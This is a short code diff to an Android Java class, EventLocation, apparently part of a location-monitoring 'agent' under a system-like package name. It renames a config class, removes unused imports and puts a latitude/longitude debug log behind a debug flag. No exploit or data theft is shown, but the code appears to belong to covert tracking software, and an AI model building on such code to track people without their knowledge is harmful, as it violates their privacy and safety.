@@ -11,16 +11,12 @@ package com.android.service.event;
 
 import java.io.IOException;
 
-import android.location.Location;
-import android.location.LocationListener;
-import android.os.Bundle;
 import android.util.Log;
 
 import com.android.service.agent.position.GPSLocator;
 import com.android.service.agent.position.GPSLocatorDistance;
 import com.android.service.agent.position.RangeObserver;
-import com.android.service.auto.AutoConfig;
-import com.android.service.conf.Configuration;
+import com.android.service.auto.Cfg;
 import com.android.service.util.DataBuffer;
 
 public class EventLocation extends EventBase implements RangeObserver {
@@ -47,7 +43,7 @@ public class EventLocation extends EventBase implements RangeObserver {
 			locator.join();
 		} catch (InterruptedException e) {
 			
-			if(AutoConfig.DEBUG) { e.printStackTrace(); }
+			if(Cfg.DEBUG) { e.printStackTrace(); }
 		}
 		locator = null;
 	}
@@ -68,7 +64,7 @@ public class EventLocation extends EventBase implements RangeObserver {
 			longitudeOrig = (float) databuffer.readDouble();
 			
 			
-			Log.d("QZ", TAG + " Lat: " + latitudeOrig + " Lon: " + longitudeOrig
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Lat: " + latitudeOrig + " Lon: " + longitudeOrig
 					+ " Dist: " + distance);
 		}catch(IOException ex){
 			return false;
